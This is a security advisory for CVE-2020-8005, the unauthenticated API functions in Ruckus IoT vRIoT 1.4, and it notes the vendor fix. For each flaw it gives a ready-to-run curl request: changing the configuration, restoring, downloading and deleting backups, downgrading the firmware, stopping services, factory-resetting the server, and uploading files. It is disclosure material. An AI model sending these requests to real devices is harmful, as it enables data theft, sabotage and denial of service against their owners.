# SSD Advisory - Ruckus IoT vRIoT Server Vulnerabilities

## Vulnerability Summary
The Ruckus IoT Suite is a collection of network hardware and software
infrastructure used to enable multi-standard Internet of Things devices access
the network. The IoT Controller, part of the IoT Suite, is a virtual
controller that performs connectivity, device and security management for
non Wi-Fi devices.

Many functionalities are exposed by the IoT Controller which naturally require a
form of authentication. Authentication is present in the Controller in the form
of a login mechanism, but there are many functions which ignore the
authentication of a user and allow unauthorized users to issue different
commands, resulting in potential security breaches.

## CVE
CVE-2020-8005

## Credit
An independent Security Researcher has reported this vulnerability to SSD Secure Disclosure program.

## Affected Systems
Ruckus IoT vRIoT Version 1.4

## Vendor Response
Ruckus has fixed the vulnerability in vRIoT Server version 1.5.0.0.34. For more information see [Ruckus Software Release](https://support.ruckuswireless.com/software/2348-ruckus-iot-1-5-ga-vriot-server-software-release-ova-install-image)

## Vulnerability Details
There are multiple unprotected functions in the Controller portal of the Ruckus
IoT server. Many functions, such as changing the admin password, are protected
by authentication and return a `401 Unauthorized` when called without supplying
an authentication header or cookie, proving one is an authorized user of the
system. But there are many other functions which aren't protected and a remote
unauthenticated user can use them to gain privileged access and disable
privileged processes or access sensitive data. Many exploitable bugs were found,
which include:

1. Remote pre-auth configuration manipulation
2. Full access to backups including restoration, retrieval and deletion of
   backups.
3. Downgrading and upgrading firmware versions
4. Control of system services
5. Remote factory reset of the server

There are 3 other unprotected functions which yield unclear security impact and
were not investigated further, but are nevertheless included.

### Reproduction
_Remote Configuration Change_

The service located at `/service/init` is responsible for configuration
management. When sending it an HTTP PATCH request, the supplied JSON formatted
configuration will be interpreted and saved. This allows the configuration of
different important settings such as DNS servers.

``` shell
curl -i -s -k -X 'PATCH'																		\
-H 'Host: iot-server'																			\
-H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0'	\
-H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5'											\
-H 'Accept-Encoding: gzip, deflate'																\
-H 'Referer: https://iot-server/refUI/'															\
-H 'Content-Type: application/json'																\
-H 'X-Requested-With: XMLHttpRequest'															\
-H 'Content-Length: 267'																		\
-H 'Connection: close'																			\
--data-binary '{"configurations":{"hostname":"vriot1","dns":"8.8.8.8","timezone":"America/Los_Angeles","ipv4_mode_radio":"1","ip-address":"iot-server","dns2":"8.8.4.4","gateway":"10.10.10.1","subnet-mask":"255.255.255.0","systemtime":["1",null,"ntp.ubuntu.com"],"key":"","cert":""}}' \
'https://iot-server/service/init'
```

The device needs to reboot it's services, which should all happen automatically
  as part of it's routine, and only then the change will take effect.

---

_Manipulation of Arbitrary Backups_

The backup manipulation service, which is located at `/service/v1/db`,
allows for three operations: loading, downloading and deletion of backup files. 

Loading backups:

When sending an HTTP POST request to `/service/v1/db/restore` the server will
restore the backups file requested in the request body. This name can be either
known beforehand or bruteforced, as the filename follows a specific pattern.

``` shell
curl -i -s -k -X 'POST'																			\
-H 'Host: iot-server'																			\
-H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0'	\
-H 'Accept: */*'																				\
-H 'Accept-Language: en-US,en;q=0.5'															\
-H 'Accept-Encoding: gzip, deflate'																\
-H 'Referer: https://iot-server/refUI/'															\
-H 'Content-Type: application/json'																\
-H 'X-Requested-With: XMLHttpRequest'															\
-H 'Content-Length: 54'																			\
-H 'Connection: close'																			\
--data-binary '{"fileName":"VRIOT_DB_2019-09-27-00-48-59_GMT.tar.gz"}'							\
'https://iot-server/service/v1/db/restore'
```

Device will reboot to restore the arbitrarily chosen backup

Downloading backups:

Sending an HTTP GET to `/service/v1/db/backup` with `filename` as a parameter
will yield you the requested backup file. This name can either be known
beforehand or brute forced easily.

``` shell
curl -i -s -k -X 'GET'																			\
-H 'Host: iot-server'																			\
-H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0'	\
-H 'Accept: */*'																				\
-H 'Accept-Language: en-US,en;q=0.5'															\
-H 'Accept-Encoding: gzip, deflate'																\
-H 'Referer: https://iot-server/refUI/'															\
-H 'X-Requested-With: XMLHttpRequest'															\
-H 'Connection: close'																			\
'https://iot-server/service/v1/db/backup?fileName=VRIOT_DB_2019-09-27-00-48-59_GMT.tar.gz'


HTTP/1.1 200 OK
...
{"message": {"ok": 1, "file_path": "/static/dbbackup/VRIOT_DB_2019-09-27-00-48-59_GMT.tar.gz"}}	

wget https://iot-server/static/dbbackup/VRIOT_DB_2019-09-27-00-48-59_GMT.tar.gz
```

Deleting backups:

Sending an HTTP DELETE request to `/service/v1/db/backup` will enable the
deletion of backup files. The filename of the backup is supplied through the
parameter.

``` shell
curl -i -s -k -X 'DELETE'																		\
-H 'Host: iot-server'																			\
-H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0'	\
-H 'Accept: */*'																				\
-H 'Accept-Language: en-US,en;q=0.5'															\
-H 'Accept-Encoding: gzip, deflate'																\
-H 'Referer: https://iot-server/refUI/'															\
-H 'Content-Type: application/json'																\
-H 'X-Requested-With: XMLHttpRequest'															\
-H 'Content-Length: 54'																			\
-H 'Connection: close'																			\
--data-binary '{"fileName":"VRIOT_DB_2019-09-27-03-53-40_GMT.tar.gz"}'							\
'https://iot-server/service/v1/db/backup'
```

---

_Firmware Version Manipulation_

The service located in `/service/upgrade/flow` allows changing the firmware of
the device. This allows downgrade attacks, where a potential attacker may change
the firmware to a vulnerable one.

``` shell
curl -i -s -k  -X 'POST'																		\
-H 'Host: iot-server'																			\
-H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0'	\
-H 'Accept: */*'																				\
-H 'Accept-Language: en-US,en;q=0.5'															\
-H 'Accept-Encoding: gzip, deflate'																\
-H 'Referer: https://iot-server/refUI/'															\
-H 'Content-Type: application/json'																\
-H 'X-Requested-With: XMLHttpRequest'															\
-H 'Content-Length: 24'																			\
-H 'Connection: close'																			\
--data-binary '{"version":"1.4.0.0.17"}'														\
'https://iot-server/service/upgrade/flow'
```

The device will reboot if the supplied firmware version exists.

---

_Service Manipulation_

The service located at `/module/` allows for three operations: stop, start and
restart. The operation can be appended URL, and the name of the process is
specified using the parameter. The name of the process can be retrieved through
a terminal of a machine running the operating system, like a virtual machine.

``` shell
curl -i -s -k  -X 'POST'																		\
-H 'Host: iot-server'																			\
-H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0'	\
-H 'Accept: */*'																				\
-H 'Accept-Language: en-US,en;q=0.5'															\
-H 'Accept-Encoding: gzip, deflate'																\
-H 'Referer: https://iot-server/refUI/'															\
-H 'Content-Type: application/json'																\
-H 'X-Requested-With: XMLHttpRequest'															\
-H 'Content-Length: 23'																			\
-H 'Connection: close'																			\
--data-binary '{"process":"core:mqtt"}'															\
'https://iot-server/module/stop'
```

---

_Remote Factory Reset_

The service running at `/reset` enable issuing a factory reset of the machine.
This deletes all configurations and information stored on the machine. This
functionality enables an attacker to create a Denial of Service attack.

``` shell
curl -i -s -k  -X 'POST'																		\
-H 'Host: iot-server'																			\
-H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0'	\
-H 'Accept: */*'																				\
-H 'Accept-Language: en-US,en;q=0.5'															\
-H 'Accept-Encoding: gzip, deflate'																\
-H 'Referer: https://iot-server/refUI/'															\
-H 'X-Requested-With: XMLHttpRequest'															\
-H 'Connection: close'																			\
-H 'Content-Length: 0'																			\
'https://iot-server/reset'
```

---

_Additional Bugs (unknown impacts)_

* Upload new images
``` shell
curl -i -s -k  -X 'POST'																		\
-H 'Host: iot-server'																			\
-H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0'	\
-H 'Accept: */*'																				\
-H 'Accept-Language: en-US,en;q=0.5'															\
-H 'Accept-Encoding: gzip, deflate'																\
-H 'Referer: https://iot-server/refUI/'															\
-H 'X-Requested-With: XMLHttpRequest'															\
-H 'Content-Length: 178'																		\
-H 'Content-Type: multipart/form-data; boundary=---------------------------237911457221800'		\
-H 'Connection: close'																			\ 
--data-binary "-----------------------------237911457221800\x0d\x0aContent-Disposition: form-data; name=\"file\"; filename=\"test.image\"\x0d\x0a\x0d\x0acontent here\x0d\x0a-----------------------------237911457221800--\x0d\x0a"	\
'https://iot-server/upgrade/upload'
```

* Upload patches
``` shell
curl -i -s -k  -X 'POST'																		\
-H 'Host: iot-server'																			\
-H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0'	\
-H 'Accept: */*'																				\
-H 'Accept-Language: en-US,en;q=0.5'															\
-H 'Accept-Encoding: gzip, deflate'																\
-H 'Referer: https://iot-server/refUI/'															\
-H 'X-Requested-With: XMLHttpRequest'															\
-H 'Content-Length: 178'																		\
-H 'Content-Type: multipart/form-data; boundary=---------------------------237911457221800'		\
-H 'Connection: close'																			\
--data-binary "-----------------------------237911457221800\x0d\x0aContent-Disposition: form-data; name="\file\"; filename=\"test.patch\"\x0d\x0a\x0d\x0acontent here\x0d\x0a-----------------------------237911457221800--\x0d\x0a"	\
'https://iot-server/patch/upload'
```

* Diagnostic Data (The `generate diagnostic data` button is protected and must
  already have been generated by an admin prior)
``` shell
curl -i -s -k  -X 'GET'																			\
-H 'Host: iot-server'																			\
-H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0'	\
-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'					\
-H 'Accept-Language: en-US,en;q=0.5'															\
-H 'Accept-Encoding: gzip, deflate'																\
-H 'Referer: https://iot-server/refUI/'															\
-H 'Connection: close'																			\
-H 'Upgrade-Insecure-Requests: 1'																\
'https://iot-server/static/diagnostic/diagnostic_2019-09-26-20-43-42.tar.gz'
```
